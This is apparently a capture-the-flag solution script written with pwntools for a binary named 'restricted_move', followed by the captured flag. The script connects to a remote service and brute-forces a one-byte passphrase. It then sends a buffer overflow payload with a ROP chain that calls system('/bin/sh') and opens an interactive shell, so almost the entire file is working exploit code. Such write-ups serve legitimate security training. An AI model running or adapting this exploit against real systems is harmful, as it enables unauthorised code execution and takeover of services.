from pwn import *
context.arch = 'amd64'

e = ELF('./restricted_move')
# p = e.process()
p = remote('34.81.158.137', 7364)

p.recvuntil(b'> ')
p.sendline(b'2')
p.recvuntil(b'regenerate?\n')
p.sendline(b'1')

for i in range(256):
    print(i)
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'phrase:\n')
    p.send(p8(i) * 0x40)
    ret = p.recvline()
    if b'pass phrase wrong OuO...' not in ret:
        break

p.recvuntil(b'> ')
p.sendline(b'4')
p.recvuntil(b'username:\n')

bss = 0x404020
pop_rdi = 0x0000000000401883
ret = 0x000000000040101a
payload = b'/bin/sh\x00' + b'a' * 0x80
ropc = flat([pop_rdi, bss, ret, e.plt['system']])
# raw_input('>')
p.send(payload + ropc)

p.interactive()

# TSJ{R3strict_1s_4_G0Od_k3yw0rd_F0r_0u0_s0ci3ty}